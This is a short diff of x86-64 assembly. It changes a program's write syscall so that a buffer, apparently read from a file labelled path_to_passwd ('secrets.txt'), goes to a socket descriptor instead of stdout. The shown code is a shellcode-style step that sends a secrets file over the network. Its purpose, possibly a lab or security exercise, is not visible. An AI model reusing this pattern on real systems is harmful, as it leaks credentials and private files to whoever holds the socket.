@@ -35,14 +35,14 @@ _start:
 
 	# syscall to write
 	mov	$1, %rax 		# system call num 1 is write
-	mov	$1, %rdi 		# file descriptor 3 is our socket --------------------?
+	mov	$4, %rdi 		# file descriptor 4 is our socket --------------------?
 	mov 	%rsp, %rsi		# writing from earlier allocated buffer
 	mov	%r9, %rdx		# write to whole buffer
 	syscall
 
         # exit(0)
 	mov	$60, %rax
-        xor     %rdi, %rdi              # we want return code 0
+        mov     $100, %rdi              # we want return code 100
         syscall                         # invoke operating system to exit
 path_to_passwd:
         .ascii  "secrets.txt"
